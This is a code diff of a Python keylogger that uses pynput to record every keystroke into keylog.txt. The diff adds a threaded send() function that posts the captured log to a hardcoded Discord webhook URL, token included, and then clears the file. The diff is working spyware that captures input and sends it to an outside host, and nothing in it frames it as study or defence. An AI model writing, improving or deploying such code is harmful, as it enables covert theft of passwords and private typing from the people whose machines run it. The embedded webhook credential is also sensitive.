@@ -1,10 +1,13 @@
 from pynput import keyboard
 from dhooks import Webhook
+import threading
 #import requests
 #import json
 import time
 
-hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")
+
+#multithreading
+
 #rdm_sec = [500,600,700,800,900]
 
 # This function runs every time a key is pressed
@@ -23,16 +26,43 @@ def on_press(key):
         file.write(log)
 
 
-# Start the key listener
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
-
+def llistener():
+    # Start the key listener
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 
 #send content of file function
-#def send_file():
+
+hook = Webhook ("https://discord.com/api/webhooks/1403879249550643331/PkMQvk-fo0oxhsXNMTwoTkFMy_gGN6KIfk8NRFnvxgppHDeQTEfAspy-LHw2-K3dKiPb")
+
+def send():
     with open("keylog.txt", "r") as file:
         content = file.read()
+    if not content.strip():
+        return
+    # data = "hello world test!"
+    hook.send(content)
+    with open("keylog.txt", "r+") as con:
+        con.seek(0)
+        con.truncate()
+
+    time.sleep(300)
+
+
+thread1 = threading.Thread(target=llistener())
+thread1.start()
+thread2 = threading.Thread(target=send)
+thread2.start()
+# Start the threads
+#wait for both threads to finish
+thread1.join()
+thread2.join()
+
+#while True:
+#    send()
+#    time.sleep(100)
+
 
 
 
@@ -43,7 +73,7 @@ with keyboard.Listener(on_press=on_press) as listener:
 #     return
 
 
-    hook.send(content)
+
 #    response = requests.post(webhook, json=json)
 #    print(response.json())
 
